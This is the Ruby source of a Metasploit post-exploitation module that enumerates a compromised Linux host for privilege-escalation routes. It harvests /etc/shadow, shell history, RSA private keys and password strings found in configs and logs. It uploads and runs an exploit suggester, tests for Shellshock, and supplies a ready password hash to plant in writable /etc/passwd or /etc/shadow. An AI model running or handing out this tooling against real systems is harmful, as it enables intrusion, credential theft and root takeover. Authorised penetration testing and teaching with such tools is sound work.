##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::System

  SUID_SUDO_FILES = [ 'nmap', 'vim', 'nano', 'perl', 'python', 'find', 'pip', 'more', 'less', 'ruby', 'php', 'lua', 'tcpdump', 'bash' ] 

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Linux Privilege Escalation Information Gathering',
      'Description'   => %q{
        This module gathers a multitude of information for Linux privilege
        escalation without writing to the target. Initial work based on 
        linuxprivchecker.py by Mike Czumak and "Basic Linux Privilege Escalation" by g0tmi1l. 
        With further improvements as I discover unique methods for PE.
      },
      'License'       => MSF_LICENSE,
      'Author'        =>
        [
          'sn0wfa11 <jhale85446[at]gmail.com>'
        ],
      'Platform'      => ['linux'],
      'SessionTypes'  => ['shell', 'meterpreter'],
      'References'    => 
        [
          [ 'URL', 'https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/' ],
          [ 'URL', 'http://www.securitysift.com/download/linuxprivchecker.py' ],
          [ 'URL', 'https://github.com/rebootuser/LinEnum' ]
        ]
    ))

    register_options(
      [
        OptInt.new('TIMEOUT', [ true, "Timeout on the execute command. (In seconds)", 300]),
        OptString.new('PASSWORD', [ false, "Password of current user, for 'sudo su' check"]),
        OptBool.new('DEEP', [ true, "Perform Deep File Scan", true]),
        OptBool.new('LES', [ true, "Run Linux Exploit Suggester Script (Requires writable directory)", false]),
        OptString.new('WRITEABLE_DIR', [ false, "Writeable directory on target for Linux Exploit Suggester", "/tmp"]),
        OptString.new('LES_PATH', [ false, "Path to Linux Exploit Suggester on Local Machine", "/root/git/linux-exploit-suggester/linux-exploit-suggester.sh"])
      ], self.class)
  end

  def run
    final_output = ""
    @@quick_fails_ouput = "\n[*] QUICK FAIL$:\n"

    sysinfo = get_sysinfo
    @@distro = file_read("/etc/issue")
    @@distro = @@distro.gsub(/\n|\\n|\\l/,'') if @@distro
    @@kernel_full = sysinfo[:kernel]
    if sysinfo[:version] && sysinfo[:version] != ""
      @@release = sysinfo[:version]
    else
      @@release = @@distro
    end
    @@user = execute("whoami")
    @@hostname = execute("hostname")

    #kernel_number = kernel_full.split(" ")[2].split("-")[0] if kernel_full
    #kernel_split = kernel_full.split(" ")[2].split("-")[0].split(".") if kernel_full
    #kernel_suffix = kernel_full.split(" ")[2].split("-")[1] if kernel_full

    # Print the info
    print_good("Info:")
    print_good("\t#{@@distro}")
    print_good("\t#{@@kernel_full}")
    if datastore['PASSWORD']
      print_good("\tModule running as \"#{@@user}\" user against #{@@hostname} with password: #{datastore['PASSWORD']}")
    else
      print_good("\tModule running as \"#{@@user}\" user against #{@@hostname}")
    end

    final_output << bigline
    final_output << "LINUX PRIVILEGE ESCALATION CHECKS by sn0wfa11"
    final_output << bigline

    print_status("Getting Basic Info")
    basic_info_output = basic_info

    print_status("Looking for Initial Quick Fails")
    @@quick_fails_ouput << quick_fails

    if datastore['LES']
      write_dir = datastore['WRITEABLE_DIR']
      les_path = datastore['LES_PATH']
      print_error("You must provide a writeable directory to run Linux Exploit Suggester") if !write_dir
      print_error("You must provide a path Linux Exploit Suggester") if !les_path
      les_output = prnt("Linux Exploit Suggester", les(les_path, write_dir)) if les_path && write_dir
    end

    print_status("Getting App and Tool Info")
    tools_info_output = tools_info

    print_status("Getting Network Info")
    network_info_output = network_info

    print_status("Getting Basic File System Info")
    filesystem_info_output = filesystem_info

    print_status("Getting User Info")
    user_info_output = user_info

    print_status("Getting Environmental Info")
    env_info_output = env_info

    print_status("Getting File and Directory Permissions")
    file_dir_perms_output = file_dir_perms

    print_status("Getting Processes and Application Information")
    proc_aps_info_output = proc_aps_info

    if datastore['DEEP']
      print_status("Getting Extra Information and Performing Deep File Search")
      extra_info_output = extra_info
    else
      print_status("Skipping Deep File Search")
      extra_info_output = ""
    end

    # Build final output
    final_output << basic_info_output + smline
    final_output << @@quick_fails_ouput + smline
    final_output << les_output + smline if les_output
    final_output << tools_info_output + smline
    final_output << network_info_output + smline
    final_output << filesystem_info_output + smline
    final_output << user_info_output + smline
    final_output << env_info_output + smline
    final_output << file_dir_perms_output + smline
    final_output << proc_aps_info_output + smline
    final_output << extra_info_output + smline
    final_output << bigline
    save(final_output)


  end

  ###########################################
  # Managment Functions
  ###########################################

  def bigline
    "\n=================================================================================================\n"
  end

  def smline
    "\n-------------------------------------------------------------------------------------------------\n"
  end

  def save(data, ctype = 'text/plain')
    ltype = "linux.enum.system"
    loot = store_loot(ltype, ctype, session, data, "priv_check.txt", "LINUX PRIV CHECK")
    print_good("LINUX PRIV CHECK stored in #{loot}")
  end

  def execute(cmd, time_out = datastore['TIMEOUT'])
    vprint_status("Execute: #{cmd}")
    output = cmd_exec(cmd, nil, time_out)
    vprint_line("#{output}")
    return output
  end

  def get(msg, cmd)
    output = "\n"
    output << "[+] #{msg}\n"
    result = execute(cmd)
    result.lines.each do |line|
      output << "    #{line}" if line.strip != ""
    end
    return output << "\n"
  end

  def get_h(msg, cmd)
    output = "\n"
    output << "[+] #{msg}\n"
    result = execute(cmd)
    return "" if !result or result == ""
    result.lines.each do |line|
      output << "    #{line}" if line.strip != ""
    end
    return output << "\n"
  end


  def prnt(msg, input)
    output = "\n"
    output << "[+] #{msg}\n"
    return output << format(input)
  end

  def format(input)
    output = ""
    return "" unless input
    input.lines.each do |line|
      output << "    #{line}" if line.strip != ""
    end
    return output  << "\n"
  end

  #################################################
  # Linux Exploit Suggester Functions
  #################################################

  def les(les_path, write_dir)
    output = ""
    print_status("\nLinux Exploit Suggester")

    les_plant = upload_les(les_path, write_dir)
    if les_plant
      print_status("Setting Executable Rights")
      execute("chmod +x #{les_plant}")
      print_status("Running Linux Exploit Suggester... Stand by...")
      output = execute("#{les_plant}")
      if output != ""
        print("\n#{output}\n")
        output = format_les(output)
      else
        print_error("Linux Exploit Suggester Execution Failed :(")
      end
      rm_f(les_plant)
      return output
    else
      return ""
    end
  end

  def upload_les(les_path, write_dir)
    les_target = "#{write_dir}/#{Rex::Text.rand_text_alpha(8, "")}.sh"
    print_status("Attempting to upload #{les_path} to #{les_target} on #{sysinfo['Computer']}...")
    
    begin
      upload_file(les_target, les_path)
      if file?(les_target)
        print_good("LES uploaded!") 
        return les_target
      else
        print_error("Unable to upload")
        return nil
      end
    rescue ::Exception => e
      print_error("Error uploading LES: #{e.class} #{e}")
      print_error(e.to_s)
      return nil
    end
  end

  def format_les(input)
    output = input.gsub("[0m", "")
    output = output.gsub("[1;37m", "")
    output = output.gsub("[1;32m", "")
    output = output.gsub("[1;36m", "")
    output = output.gsub("[1;32m", "")
    output = output.gsub("[1;34m", "")
    output = output.gsub("[1;93m", "")
    output = output.gsub("[0;93m", "")
    output = output.gsub("[91;1m", "[*!]-> ")
    return output
  end

  #################################################
  # File Read Functions
  #
  # Why are these here and not just use cat???
  # Well... There are some CTF devs who like to
  # think they are sneaky and replace 'cat' with
  # say, a program that just prints an ASCII cat...
  # So these functions eliminate the use of 'cat'
  # in Meterpreter shells! No more ASCII cats!
  #################################################

  def file_to_array(file_name)
    result = file_read(file_name) if file_exist?(file_name)
    return nil unless result && result != ""
    return result.to_s.split("\n")
  end

  def file_read_grep(file_name, search_str)
    output = ""
    array = file_to_array(file_name)
    return nil unless array
    array.each do |line|
      output << "#{line}\n" if line =~ /#{search_str}/
    end
    return output
  end

  def get_file(msg, file_name)
    output = "\n"
    output << "[+] #{msg}\n"
    array = file_to_array(file_name)
    return "" unless array
    array.each do |line|
      output << "    #{line}\n"
    end
    return output << "\n"
  end

  def get_file_grep(msg, file_name, search_str, rev=false)
    output = "\n"
    output << "[+] #{msg}\n"
    array = file_to_array(file_name)
    return "" unless array
    array.each do |line|
      if rev
        output << "    #{line}\n" unless line =~ /#{search_str}/
      else
        output << "    #{line}\n" if line =~ /#{search_str}/
      end
    end
    return output
  end

  ########################################################
  # File Reading Base Functions
  #
  # Yes, yes... I stole these from
  # Msf::Post::File (read_file and _read_file_meterpreter)
  # I just couldn't handle the error handling...
  # Do you want a bunch of error messages when it cannot
  # open a file that you don't have access too?
  # I thought not ;)
  ########################################################

  def file_read(file_name)
    data = nil
    if session.type == "meterpreter"
      data = file_read_meterpreter(file_name)
    elsif session.type == "shell"
      if session.platform == 'windows'
        data = session.shell_command_token("type \"#{file_name}\"")
      else
        data = session.shell_command_token("cat \"#{file_name}\"")
      end
    end
    return data
  end

  def file_read_meterpreter(file_name)
    begin
      fd = session.fs.file.new(file_name, "rb")
    rescue ::Rex::Post::Meterpreter::RequestError => e
      vprint_error("Failed to open file: #{file_name}: #{e}")
      return nil
    end
    data = fd.read
    begin
      until fd.eof?
        data << fd.read
      end
    ensure
      fd.close
    end
    return data
  end

  ###########################################
  # Enumeration Functions
  ###########################################

  def basic_info
    output = "\n[*] BASIC SYSTEM INFO:\n"
    output << prnt("Kernel", @@kernel_full)
    output << prnt("Hostname", @@hostname)
    output << prnt("Operating System", @@distro)
    output << prnt("Full Release Info", @@release) if @@release && @@release != ""
    output << cpu_info
    output << prnt("Current User", @@user)
    output << get("Current User ID", "id")
    output << sudo_rights
    output << get_h("UDEV - Check for PE if < 141 and Kernel 2.6.x!", "udevadm --version 2>/dev/null")
    output << get_h("Printer - CUPS???", "lpstat -a 2>/dev/null")
    return output
  end

  def quick_fails
    output = ""
    output << shellshock
    output << mysql_nopass
    output << mysql_as_root
    output << sudo_group
    output << sudo_su_check
    output << world_writable_passwd
    output << world_writable_shadow
    output << readable_shadow
    output << check_no_root_squash
    output << world_writable_exports
    output << docker_group
    return output
  end

  def tools_info
    output = "\n[*] PROGRAMMING LANGUAGES AND DEV TOOLS:\n"
    output << execute("which awk perl python pip ruby gcc g++ vi vim nano nmap find netcat nc ncat wget curl tftp ftp tcpdump tmux screen 2>/dev/null")
    output << "\n"
    return output
  end

  def network_info
    output = "\n[*] NETWORKING INFO:\n"
    output << get("Interfaces", "/sbin/ifconfig -a")
    output << get("Netstat", "netstat -antup | grep -v 'TIME_WAIT' | grep -v 'CLOSE_WAIT'")
    output << get("Route", "/sbin/route")
    output << get_h("Iptables", "iptables -L 2>/dev/null")
    return output
  end

  def filesystem_info
    output = "\n[*] FILESYSTEM INFO:\n"
    output << get("Mount results", "mount")
    output << get_file("fstab entries", "/etc/fstab")
    output << get("Drive Info", "df -h")
    output << get_file("Checking Exports: If present look for no_root_squash on NFS.", "/etc/exports")
    output << get("Scheduled cron jobs", "ls -la /etc/cron* 2>/dev/null")
    output << get_h("Crontab for current user", "crontab -l")
    output << get_h("Writable cron dirs", "ls -aRl /etc/cron* 2>/dev/null | awk '$1 ~ /w.$/' 2>/dev/null")
    output << get_h("Anything in /var/spool/cron/crontabs", "ls -la /var/spool/cron/crontabs 2>/dev/null")
    output << get_h("Anacron Jobs", "ls -la /etc/anacrontab 2>/dev/null; cat /etc/anacrontab 2>/dev/null")
    return output
  end

  def user_info
    output = "\n[*] USER INFO:\n"
    output << get("Logged in User Activity", "w 2>/dev/null")
    output << get("Last user to log in", "lastlog 2>/dev/null | grep -v \"Never\" 2>/dev/null")
    output << get_h("Super Users Found:", "grep -v -E '^#' /etc/passwd | awk -F: '$3 == 0{print $1}'")
    output << get_h("Sudoers Configuration", "grep -v -e '^$' /etc/sudoers 2>/dev/null |grep -v \"#\" 2>/dev/null")
    output << get_h("Recent sudo's", "find /home -name .sudo_as_admin_successful 2>/dev/null")
    output << get_h("Root Permitted to SSH", "grep \"PermitRootLogin \" /etc/ssh/sshd_config 2>/dev/null | grep -v \"#\" | awk '{print  $2}'")
    output << get_h("Root and Current User History Rights (depends on privs)", "ls -la ~/.*_history; ls -la /root/.*_history 2>/dev/null")
    output << history_info
    output << get_file_grep("Sudoers (privileged)", "/etc/sudoers", "#", true)
    output << get_file("All Users", "/etc/passwd")
    output << get_file_grep("User With Potential Login Rights", "/etc/passwd", "/bin/bash")
    output << get_file("Group List", "/etc/group")
    return output
  end

  def env_info
    output = "\n[*] ENVIRONMENTAL INFO:\n"
    output << get_h("SELinux Status", "sestatus 2>/dev/null")
    output << get_file("Available Shells", "/etc/shells")
    output << get("Current Umask values", "umask -S 2>/dev/null; umask 2>/dev/null")
    output << get("Umask in /etc/login.defs", "grep -i \"^UMASK\" /etc/login.defs 2>/dev/null")
    output << get("Environment Variables", "env 2>/dev/null | grep -v 'LS_COLORS'")
    output << get_h("Sockets - Look for strange stuff. Is tmux or screen installed?", "find / \\( -type s \\) -exec ls -ld {} \\; 2>/dev/null")
    output << get_h("Pipes - Look for strange stuff. Is tmux or screen installed?", "find / \\( -type p \\) -exec ls -ld {} \\; 2>/dev/null")
  end

  def file_dir_perms
    output = "\n[*] FILE AND DIRECTORY PERMISSIONS/CONTENTS:\n"
    output << get("Protected Files", "ls -al /etc/passwd; ls -al /etc/shadow; ls -al /etc/group")
    output << get("Logfile Permissions", "ls -al /var/log/syslog 2>/dev/null; ls -al /var/log/auth.log 2>/dev/null")
    output << get("World Writeable Directories for User/Group 'Root'", "find / \\( -wholename '/home/homedir*' -prune \\) -o \\( -type d -perm -0002 \\) -exec ls -ld '{}' ';' 2>/dev/null | grep root")
    output << get("World Writeable Directories for Users other than Root", "find / \\( -wholename '/home/homedir*' -prune \\) -o \\( -type d -perm -0002 \\) -exec ls -ld '{}' ';' 2>/dev/null | grep -v root")
    output << get("World Writable Files", "find / \\( -wholename '/home/homedir/*' -prune -o -wholename '/proc/*' -prune \\) -o \\( -type f -perm -0002 \\) -exec ls -l '{}' ';' 2>/dev/null")
    output << get("Checking if root's home folder is accessible", "ls -ahlR /root 2>/dev/null")
    output << suid_files
    output << get("SGID Files and Directories", "find / \\( -perm -2000 \\) -exec ls -ld {} \\; 2>/dev/null")
    return output
  end

  def proc_aps_info
    output = "\n[*] PROCESSES AND APPLICATIONS:\n"
    output << get_services(@@release)
    output << get("Current processes", "ps aux | awk '{print $1,$2,$9,$10,$11}'")
    output << get("Process binary path and permissions", "ps aux 2>/dev/null | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++' 2>/dev/null")
    output << get_h("Apache Version and Modules", "apache2 -v 2>/dev/null; apache2ctl -M 2>/dev/null; httpd -v 2>/dev/null; apachectl -l 2>/dev/null")
    return output
  end

  def extra_info
    output = "\n[*] Extra Information and Deep File Search:\n"
    output << get_h("Find files with readable RSA Private Keys", "grep -Irni \"BEGIN RSA PRIVATE KEY\" / 2>/dev/null")
    output << get_h("GIT Directories", "find / \\( -type d -name \".git\" \\) -exec ls -ld {} \\; 2>/dev/null")
    output << get("Listing other home folders", "ls -ahlR /home 2>/dev/null")
    output << files_owned_users
    output << get_h("PHP Files Containing Keyword: 'password'", "find / -name '*.php' 2>/dev/null | xargs -l10 egrep 'pwd|password|Password|PASSWORD' 2>/dev/null")
    output << get_h("Logs Containing Keyword: 'password'", "find /var/log -name '*.log' 2>/dev/null | xargs -l10 egrep 'pwd|password|Password|PASSWORD' 2>/dev/null")
    output << get_h("Config Files Containing Keyword: 'password'", "find /etc -name '*.c*' 2>/dev/null | xargs -l10 egrep 'pwd|password|Password|PASSWORD' 2>/dev/null")
    output << get_file("Apache Config File", "/etc/apache2/apache2.conf")
    output << get_packages(@@release)
    return output
  end

  ##########################################
  # User Enumeration Functions
  ##########################################
  def files_owned(user)
    return get("Files Owned by #{user}", "find / -user #{user} -type f -size +0M -ls 2>/dev/null")
  end

  def files_owned_users
    output = "\n[*] Files containing data owned by users other than root\n"
    initial_list = file_read_grep("/etc/passwd", "/bin/bash")
      initial_list.lines.each do |line|
        user = line.split(':')[0]
        output << files_owned(user) unless user == "root"
      end
    return output
  end

  ###########################################
  # Specific Distro Functions
  ###########################################

  def get_services(release)
    output = "\n[+] Current Services\n"
    case release.downcase
    when /fedora|redhat|suse|mandrake|oracle|amazon/
      output << execute("/sbin/chkconfig --list 2>/dev/null")
    when /slackware/
      output << "\nEnabled:\n*************************\n"
      output << execute("ls -F /etc/rc.d | grep \'*$\' 2>/dev/null")
      output << "\n\nDisabled:\n*************************\n"
      output << execute("ls -F /etc/rc.d | grep \'[a-z0-9A-z]$\' 2>/dev/null")
    when /ubuntu|debian/
      output << execute("service --status-all 2>/dev/null")
    when /gentoo/
      output << execute("/bin/rc-status --all 2>/dev/null")
    when /arch/
      output << execute("/bin/egrep '^DAEMONS' /etc/rc.conf 2>/dev/null")
    else
      output << "Could not determine the Linux Distribution to get list of configured services\n"
    end
    output << "\n"
    return output
  end

  def get_packages(release)
    output = "\n[+] Installed Packages\n"
    case release.downcase
    when /fedora|redhat|suse|mandrake|oracle|amazon/
      output << execute("rpm -qa | sort -u")
    when /slackware/
      output << execute("ls /var/log/packages")
    when /ubuntu|debian/
      output << execute("dpkg -l | awk '{$1=$4=\"\"; print $0}'")
    when /gentoo/
      output << execute("equery list")
    when /arch/
      output << execute("/usr/bin/pacman -Q")
    else
      output << "Could not determine package manager to get list of installed packages\n"
    end
    output << "\n"
    return output
  end

  ###########################################
  # Specific Checks
  ###########################################

  def history_info
    output = ""
    files = execute("ls ~/.*_history; ls /root/.*_history 2>/dev/null")
    return "" unless files
    files.lines.each do |line|
      output << get_file("History #{line}", line)
    end
    return output
  end

  def cpu_info
    output = ""
    result = file_read("/proc/cpuinfo")
    return "" unless result
    cpu_info = result.split("\n\n")[0]
    cpu_info.split("\n").each do |line|
      output << "Speed: " + line.split(': ')[1] + "\n" if line =~ /cpu MHz/
      output << "Product: " + line.split(': ')[1]  + "\n" if line =~ /model name/
      output << "Vendor: " + line.split(': ')[1] + "\n" if line =~ /vendor_id/
      output << "Bits: " + line.split(': ')[1] + "\n" if line =~ /cache_alignment/
    end
    output << "Cores: " + result.split("\n\n").size.to_s
    return prnt("Processor Information", output)
  end

  def suid_files
    output = ""
    files = execute("find / \\( -perm -4000 \\) -exec ls -al --full-time {} \\; 2>/dev/null | sort -k6 | cut -d \" \" --complement -f 7,8")
    return "" unless files
    files = files.split("\n")
    files.each do |file|
      check_suid_file(file)
      output << "#{file}\n"
    end
    return prnt("SUID Files", output)
  end

  def check_suid_file(file)
    check_files = SUID_SUDO_FILES.dup
    check_files.each do |check_file|
      if file.downcase =~ /#{check_file}/
        print_good("QUICKFAIL!: #{check_file} has suid bit set!")
        @@quick_fails_ouput << "\n[+] QUICKFAIL!: #{check_file} has suid bit set!\n"
        @@quick_fails_ouput << format(file)
      end
    end
  end

  def sudo_rights
    output = ""
    if datastore['PASSWORD']
      password = datastore['PASSWORD']
      result = execute("echo #{password} | sudo -S -l", 15)
    else
      result = execute("sudo -l", 15)
    end
    if result.downcase =~ /may run/
      print_good("User #{@@user} has some sudo rights, check output...")
      @@quick_fails_ouput << "\n[+] User #{@@user} has some sudo rights, check output...\n"
      @@quick_fails_ouput << format(result)
      if result.downcase =~ /\*/
        print_good("QUICKFAIL!: User #{@@user} has possible wildcard in sudo!")
        @@quick_fails_ouput << "\n[+] QUICKFAIL!: User #{@@user} has possible wildcard in sudo!\n"
        @@quick_fails_ouput << format(result)
      end
      check_sudo_run(result)
    end
    if result.downcase =~ /\!env_reset/
      print_good("QUICKFAIL!: User #{@@user} has property '!env_reset' in sudo!")
      @@quick_fails_ouput << "\n[+] QUICKFAIL!: User #{@@user} has property '!env_reset' in sudo!\n"
      @@quick_fails_ouput << format(result)
    end
    return prnt("SUDO rights check", result)
  end

  def check_sudo_run(input)
    check_files = SUID_SUDO_FILES.dup
    check_files.each do |check_file|
      if input.downcase =~ /#{check_file}/
        print_good("QUICKFAIL!: User #{@@user} has sudo rights to #{check_file}!")
        @@quick_fails_ouput << "\n[+] QUICKFAIL!: User #{@@user} has sudo rights to #{check_file}!\n"
        @@quick_fails_ouput << format(input)
      end
    end
  end

  ###########################################
  # Quck-Fail Checks
  ###########################################

  def world_writeable(file_name)
    result = execute("ls -al #{file_name} 2>/dev/null | awk '$1 ~ /^........w./'")
    return result.downcase =~ /#{file_name}/
  end

  def shellshock
    output = ""
    result = execute("env X='() { :; }; echo \"CVE-2014-6271 vulnerable\"' bash -c date\n")
    if result =~ /vulnerable/
      print_good("QUICKFAIL!: Shellshock Vulnerable! Look for web app or process running as root to exploit!")
      output << "\n[+] QUICKFAIL!: Shellshock Vulnerable! Look for web app process running as root to exploit!\n"
      return output
    end
    return ""
  end

  def mysql_nopass
    output = ""
    result = execute("mysql -uroot -e 'show databases;' 2>/dev/null")
    if result.downcase =~ /database/
      print_good("QUICKFAIL!: mysql does not require a password for root user!")
      output << "\n[+] QUICKFAIL!: mysql does not require a password for root user!\n"
      output << format(result)
      return output
    end
    return ""
  end

  def mysql_as_root
    output = ""
    result = execute("ps aux | grep mysql | grep root | grep -v grep")
    if result.downcase =~ /mysql/ && !result.downcase =~ /mysqld_safe/
      print_good("QUICKFAIL!: mysql is running as root!")
      output << "\n[+] QUICKFAIL!: mysql is running as root!\n"
      output << format(result)
      return output
    end
    return ""
  end

  def sudo_group
    user = execute("whoami").downcase
    output = ""
    result = file_read_grep("/etc/group", "sudo")
    if result.downcase =~ /#{user}/
      print_good("QUICKFAIL!: " + user + " is in sudoers group! Ya gotta password?")
      output << "\n[+] QUICKFAIL!: " + user + " is in sudoers group! Ya gotta password?\n"
      output << format(result)
    end
    return output
  end

  def sudo_su_check
    output = ""
    if datastore['PASSWORD']
      password = datastore['PASSWORD']
      result = execute("echo #{password} | sudo -S su -c id", 15)
    else
      result = execute("sudo -S su -c id", 15)
    end
    if result.downcase =~ /\(root\)/
      print_good("QUICKFAIL!: User #{@@user} has sudo su rights! And... You're DONE!")
      output << "\n[+] QUICKFAIL!: User #{@@user} has sudo su rights! And... You're DONE!\n"
      output << format(result)
    end
    return output
  end

  def world_writable_passwd
    output = ""
    result = world_writeable("/etc/passwd")
    if result
      print_good("QUICKFAIL!: /etc/passwd is world writable!")
      output << "\n[+] QUICKFAIL!: /etc/passwd is world writable!\n"
      output << format(result)
      output << "\tUse hash: $1$5wAs2Vek$MolttqqR2ngg29PV6DacY1\n"
      output << "\tPassword: 12345\n"
      output << "\t\"That's the same combination I have on my luggage!\"\n"
      return output
    end
    return ""
  end

  def world_writable_shadow
    output = ""
    result = world_writeable("/etc/shadow")
    if result
      print_good("QUICKFAIL!: /etc/shadow is world writable!")
      output << "\n[+] QUICKFAIL!: /etc/shadow is world writable!\n"
      output << format(result)
      output << "\nNOTE: YOU NEED TO REBOOT TO RELOAD /etc/shadow!!! Is /etc/shadow readable?\n"
      output << "\tUse hash: $1$5wAs2Vek$MolttqqR2ngg29PV6DacY1\n"
      output << "\tPassword: 12345\n"
      output << "\t\"That's the same combination I have on my luggage!\"\n"
      return output
    end
    return ""
  end

  def readable_shadow
    output = ""
    result = file_read("/etc/shadow")
    if result
      print_good("QUICKFAIL!: /etc/shadow is readable!")
      output << "\n[+] QUICKFAIL!: /etc/shadow is readable!\n"
      output << "\tStop mining, and crash some hashes!\n"
      output << format(result)
      return output
    end
    return ""
  end

  def check_no_root_squash
    output = ""
    result = file_read_grep("/etc/exports", "no_root_squash")
    if result
      print_good("QUICKFAIL!: /etc/exports has no_root_squash!")
      output << "\n[+] QUICKFAIL!: /etc/exports has no_root_squash!\n"
      output << format(result)
      output << "\tMount an NFS Share\n"
      output << "\tAnd... Away, we go...!\n"
      return output
    end
    return ""
  end

  def world_writable_exports
    output = ""
    result = world_writeable("/etc/exports")
    if result
      print_good("QUICKFAIL!: /etc/exports is world writable!")
      output << "\n[+] QUICKFAIL!: /etc/exports is world writable!\n"
      output << format(result)
      output << "\tAdd it a little bit of 'no_root_squash'\n"
      output << "\tMount an NFS Share\n"
      output << "\tAnd... Away, we go...!\n"
      return output
    end
    return ""
  end

  def docker_group
    output = ""
    result = execute("id")
    if result.downcase =~ /\(docker\)/
      print_good("QUICKFAIL!: User #{@@user} is in the 'docker' group!")
      output << "\n[+] QUICKFAIL!: User #{@@user} is in the 'docker' group!\n"
      output << format(result)
      output << "\tTry a little: 'exploit/linux/local/docker_daemon_privilege_escalation'\n"
      return output
    end
    return ""
  end

end
